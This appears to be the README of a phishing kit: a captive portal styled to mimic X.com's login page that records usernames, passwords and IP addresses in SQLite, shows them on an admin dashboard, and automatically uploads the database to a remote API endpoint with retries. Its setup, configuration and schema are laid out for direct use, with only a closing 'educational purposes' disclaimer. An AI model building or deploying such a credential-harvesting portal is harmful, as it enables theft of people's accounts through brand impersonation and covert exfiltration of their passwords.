# X.com Captive Portal

A captive portal application styled to look like X.com (formerly Twitter) that collects user credentials and stores them in a database. It includes an admin dashboard to view all submitted data and automatic database upload to a remote API.

## Features

- **X.com Login Page**: A styled form that resembles X.com's login interface
- **Credential Collection**: Captures both username and password
- **Database Storage**: Stores username, password, IP address, and timestamp in SQLite
- **Admin Dashboard**: View all collected data in a table format
- **Auto Database Upload**: Automatically uploads database to remote API when new data is added
- **Manual Upload**: Manual database upload button in admin dashboard
- **Retry Mechanism**: Automatic retry if upload fails (configurable)

## Installation

```bash
# Install dependencies
npm install

# Start the server
npm start
```

## Configuration

Edit `config.js` to configure the API endpoint and upload settings:

```javascript
module.exports = {
  api: {
    baseUrl: 'http://database.x.com',        // Your API subdomain
    uploadEndpoint: '/upload-db',            // Upload endpoint
    timeout: 10000,                          // Request timeout
  },
  
  upload: {
    autoUpload: true,                        // Enable auto upload
    retryAttempts: 3,                        // Retry attempts
    retryDelay: 2000,                        // Delay between retries
  }
};
```

## Usage

1. Access the main portal at: http://localhost:80
2. Enter your credentials and submit the form
3. Database will be automatically uploaded to your API
4. View all submitted data at: http://localhost:80/admin
5. Use "Upload Database" button for manual uploads

## API Integration

The application automatically uploads the SQLite database file to your API endpoint:

- **Endpoint**: `http://database.x.com/upload-db`
- **Method**: `POST`
- **Content-Type**: `multipart/form-data`
- **Field**: `database` (SQLite file)

## Project Structure

- `server.js` - Main Express application with routes and database setup
- `config.js` - Configuration file for API settings
- `views/` - EJS templates for the application interface
  - `index.ejs` - Main captive portal login page styled like X.com
  - `password.ejs` - Password input page
  - `admin.ejs` - Admin dashboard with table view and upload button
  - `success.ejs` - Success page after form submission
- `xcom_users.db` - SQLite database file (created on first run)
- `UPLOAD_FEATURE.md` - Detailed documentation for upload feature

## Database Schema

```sql
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT NOT NULL,
  ip_address TEXT,
  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

## Logging

The application provides detailed console logging:

- ✅ Successful uploads
- ❌ Failed uploads with error details
- 🔄 Retry attempts
- ⚠️ Final failure after all retries

## Notes

This is a basic implementation and should be enhanced with proper authentication for the admin page in a production environment.

**Important:** This project is for educational purposes only. Do not use it to collect actual X.com credentials or for any malicious purposes.